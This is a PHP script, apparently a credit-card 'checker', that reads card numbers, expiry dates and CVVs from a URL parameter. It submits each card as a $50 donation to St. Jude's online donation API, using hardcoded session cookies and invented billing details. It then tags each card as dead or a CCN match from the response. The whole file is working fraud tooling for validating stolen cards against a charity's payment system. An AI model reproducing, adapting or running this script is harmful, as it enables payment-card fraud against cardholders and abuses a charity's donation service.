<?php
# Credits to = Arceus (@rceus|@rceuss)
error_reporting(1);
include('functions.php');

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

# Variables
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$binh = substr($cc, 0, 6);
$trest = substr($cc, 6, 16);
$mm = multiexplode(array(":", "|", ""), $lista)[1];
$yyyy = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", " "), $lista)[3];

# 1st req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://services.stjude.org/apps/oms/order');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Cookie: AKA_A2=A; bm_sz=8F70FC4B66BA64888E4790E89892A74F~YAAQBi43FwvAsD13AQAAtVcWSwqyW+q35OKODZHD0En6lVLvGtU3oNSmeJg94SUPTwyXeVF+cJxct1ubqLuJT7UCNIP/HmKbuRLelvf6oXxNoOx67VpNBO8eEwGOM0KhcRAz3ZmkYBvmYTijdR+tV9oeBghBy0i1FLiiK1Y75L5J9oCSzBlksGARuT8tOikn; check=true; AMCVS_091B467352782E0D0A490D45%40AdobeOrg=1; _gid=GA1.2.1479988145.1611930109; s_ecid=MCMID%7C48766993577518191902946027243193735287; s_visit=1; gpv_v9=sjo%3Adonate%3Adonate-to-st-jude; bookmarked=1; s_dfa=sjudeglobal; ak_bmsc=75A301E576EB5DF5415552D4E2F7D16817372E06820D0000EB3813603B8B6E71~plFwZNigPKHGBxrc8WBTc1pPDu4IS9rBsSkC/18IakiyLBHqdhtdhw6NqgVXa70jl2Wto1dSg+9QWuu82+mLNUAt4S5sYMGRrqGJbGfDWrYV08Y5BH50/DCGxGh2q7Hxdq+1P/2mbBUjx7OGG2MDG5h0zPywP3UIZRUEu1vYL/kZQ4ooqY0IIMOwe5079jjRk2Q/2JakoCGyD8v7HMhDF8ylvfb3Ey0M+DQqYTXk8PCDRt4t98+0p7gh7qen2kpt3o; s_cc=true; aam_uuid=48554642562239222592895237407489584018; ak_wfSession=1611873610~id=QzhlUKfiFFJbjLbo/AYuhgMH/xlY7tu062WVs2U/UGQ=; mbox=session#c41e56eb87e8400a97081292d9220870#1611932189|PC#c41e56eb87e8400a97081292d9220870.38_0#1675174910; AMCV_091B467352782E0D0A490D45%40AdobeOrg=-1712354808%7CMCIDTS%7C18657%7CMCMID%7C48766993577518191902946027243193735287%7CMCAAMLH-1612535128%7C3%7CMCAAMB-1612535128%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1611937528s%7CNONE%7CMCSYNCSOP%7C411-18664%7CMCAID%7CNONE%7CvVersion%7C4.3.0%7CMCCIDH%7C-407280240; StJudeSite=MEM; s_ev19=%5B%5B%27ptn21236%27%2C%271611930114494%27%5D%2C%5B%27ptn21236%27%2C%271611930333290%27%5D%5D; _ga_VSFJME5E25=GS1.1.1611930117.1.1.1611930335.0; _ga=GA1.2.1004675779.1611930109; _gat_gtag_UA_44902839_1=1; 54c93f59e0920895162a81bd20417b0e=ee3d4bc74b936e3ebaad08ec58647ba4; bm_sv=4C812B4413B0D6DA7C89FF5010766DDB~//Ssul+xEy6jCfk8g7bn9DtEXa0qYAtHoSwwIq7ZoOxAOkoevS7m+s9p91n/aWgpPUxh/CWeyjopB/7qk4ejL2lXVFVKw6T1+hlHqQbTTrZ+PSAfCBFzhAJLvM6Fg/amnvwcQDlXdFqE2/vMC351A0gNHY9QhiTvuGG2FM9X+Ps=; _abck=CAB2B5444DA12DCCCF1291D98CDE4A3B~0~YAAQNDArFx8ytz53AQAAUxYaSwWv8J+8mqw3DwvzpFa35OKn/gqBQ+0iZ/jSbp7BAx4gmI5nLMCowLXINbZcL1Mh6aW7ufkRRaAezW9cnroo4QPjqxrKQpWTgctCUtQqpXkSaKrYKg4Xg3o5zzJTKcG3Jxgm1XKm4ssSKW+BLO2C5yHVtcGrRsmVah6GH/nuC7Dl7xCYu3+2TOfc9tqLQoNN8bKTIXNIMUHI7EeN5Tjvk6Ba3RGJXyFyr9o3MMwgRo9v9xR/CEEOMpLUjElxgC8uRaAKASgmvQsNcVW5o8z8G25K6gbozx+AKaJAtQrBRGmvIe6ui0/gdSdzgXGZdouokfwbkw==~-1~-1~-1; s_tps=58; s_pvs=774; s_nr=1611930386612-New; s_eVar59=%5B%5B%27Partner%27%2C%271611930386625%27%5D%5D; s_sq=sjudeglobal%3D%2526c.%2526a.%2526activitymap.%2526page%253Dsjo%25253Adonate%25253Adonate-to-st-jude%2526link%253DDonate%252520%25252450%2526region%253Dnavigation%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dsjo%25253Adonate%25253Adonate-to-st-jude%2526pidt%253D1%2526oid%253DDonate%252520%25252450%2526oidt%253D3%2526ot%253DSUBMIT; RT="z=1&dm=stjude.org&si=26d29d95-a8c3-4141-b8b9-a4469838567e&ss=kkidkcyf&sl=2&tt=e5q&bcn=%2F%2F684fc53f.akstat.io%2F&ld=4wfr&nu=c8alatdf&cl=61iy"';
$headers[] = 'Host: services.stjude.org';
$headers[] = 'Origin: https://www.stjude.org';
$headers[] = 'Referer: https://www.stjude.org/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"lineItems":[{"type":"donation","productName":"ndm-general","productId":"QMNFujt","productCode":"donate-to-st-jude-en","sourceCode":"FPTN317DO17","amount":"50","frequency":"one time","processingFeePreference":false,"processingFeePercentage":"2","processingFee":"1.00"}],"language":"en","clientId":"donation","pathId":"/content/sites/www/en_US/home/donate/donate-to-st-jude","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36","payment":{"paymentMethod":"credit card","fingerPrintId":"ad9f8cbe81604c1c86e8c2c16ad276ff","cardNumber":"'.$cc.'","cardCvv2":"'.$cvv.'","expMonth":"'.$mm.'","expYear":"'.$yyyy.'"},"billingInfo":{"address1":"190 Corpening street","city":"New York","stateProvince":"NY","zipPostalCode":"10080","phoneNumber":"8651344131","country":"US","firstName":"Dirk M","lastName":"Fuhrmann","email":"a.ceus442@gmail.com","stayConnected":"true","consentId":"donation_en_us_3.0"}}');
$res1 = curl_exec($ch);
curl_close($ch);
echo $res1;

# card responses
if(strpos($res1, 'Payment did not go through.')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Payment did not go through</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>';
}
elseif(strpos($res1, '"reason":"CreditCardInvalidVerificationNumber"')){
echo '<span class="badge bg-warning text-dark">#CCN</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CCN Match</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>';
}